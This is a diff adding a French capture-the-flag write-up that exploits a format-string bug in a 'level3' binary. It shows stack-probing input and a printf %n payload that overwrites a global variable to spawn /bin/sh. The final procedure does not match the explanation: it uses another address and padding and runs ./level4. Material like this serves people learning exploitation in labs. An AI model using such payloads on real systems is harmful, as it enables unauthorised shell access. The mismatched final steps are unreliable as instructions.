@@ -1,0 +1,48 @@
+### Level3
+
+Code assembleur de de la fonction v() appelé par main :
+
+    ...
+    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+    0x080484da <+54>:	mov    0x804988c,%eax
+    0x080484df <+59>:	cmp    $0x40,%eax
+    ...
+
+Le contenu de l'adresse 0x804988c est copié dans le registre eax.
+Le registre eax est ensuite comparé à la valeur 64. Si elle est égale, alors cela nous lance un shell avec execve("/bin/sh").
+
+Notre porte d'entrée ce trouve dans le printf qui n'est pas protégée.
+On va pouvoir injecté du code à partir du fgets. Il sera ensuite traité par printf.
+
+Etape pour trouver la position de notre valeur AAAA dans la stack :
+
+    ./level3
+    AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+    AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830
+
+Il s'avère que l'adresse se situe à la 4ème position dans la stack :
+
+    ./level3
+    AAAA%4$p
+    AAAA0x41414141
+
+Shellcode finale :
+
+    \x8c\x98\x04\x08%60x%4$n
+
+
+- \x8c\x98\x04\x08 : 
+Ceci est l'adresse formatté 0x804988c, dont on veux changer la valeur.
+- %60x : 
+Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 4 car la taille de l'adresse compte déjà dans la valeur finale écrite à cette mëme adresse.
+- %4$n : 
+%n de printf permet d'écrire de la data à l'ènième adresse indiqué par '<valeur>$'
+
+Procédure finale :
+
+    python -c 'print "\x10\x98\x04\x08%16975428x%1$n"' > /tmp/inject
+    cat /tmp/inject - | ./level4
+
+On obtient le shell avec les permissions utilisateur du fichier. On peut maintenant aller sur le profil du level4.
+
+8049810
